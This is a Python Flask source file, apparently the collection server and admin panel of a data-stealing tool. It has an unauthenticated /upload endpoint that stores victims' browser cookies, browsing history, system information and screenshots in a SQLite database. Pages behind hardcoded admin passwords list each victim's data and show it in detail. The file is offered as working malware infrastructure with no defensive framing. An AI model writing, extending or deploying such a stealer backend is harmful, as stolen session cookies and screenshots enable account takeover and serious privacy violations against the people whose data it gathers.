from flask import Flask, request, render_template, jsonify
from flask_httpauth import HTTPBasicAuth
import sqlite3, os, json, base64
from datetime import datetime

app = Flask(__name__)
auth = HTTPBasicAuth()

# Администраторы
ADMINS = {"angel0chek": "angel0chek", "winter": "winter"}

@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        return username
    return None

DB_FILE = "database.db"

# Инициализация базы
def init_db():
    if not os.path.exists(DB_FILE):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                cookies TEXT,
                history TEXT,
                system_info TEXT,
                screenshot BLOB,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()

init_db()

# Главная панель
@app.route('/')
@auth.login_required
def admin_panel():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC")
    users = c.fetchall()
    conn.close()
    return render_template('admin.html', users=users)

# Детали пользователя
@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (user_id,))
    user = c.fetchone()
    conn.close()

    # Преобразуем JSON обратно в объекты
    cookies = json.loads(user[2]) if user[2] else []
    history = json.loads(user[3]) if user[3] else []
    system_info = json.loads(user[4]) if user[4] else {}

    return render_template(
        'user_detail.html',
        user={
            'id': user[0],
            'username': user[1],
            'cookies': cookies,
            'history': history,
            'system_info': system_info,
            'screenshot': user[5],
            'timestamp': user[6]
        }
    )

# Получение данных от клиента
@app.route('/upload', methods=['POST'])
def upload_data():
    try:
        data = request.json
        username = data.get('username', 'unknown')

        cookies = json.dumps(data.get('cookies', []))
        history = json.dumps(data.get('history', []))
        system_info = json.dumps(data.get('systemInfo', {}))

        screenshot = data.get('screenshot', None)
        if screenshot:
            # Если передан base64 DataURL
            screenshot = base64.b64decode(screenshot.split(',')[-1])
        else:
            screenshot = None

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute(
            "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
            (username, cookies, history, system_info, screenshot, timestamp)
        )
        conn.commit()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
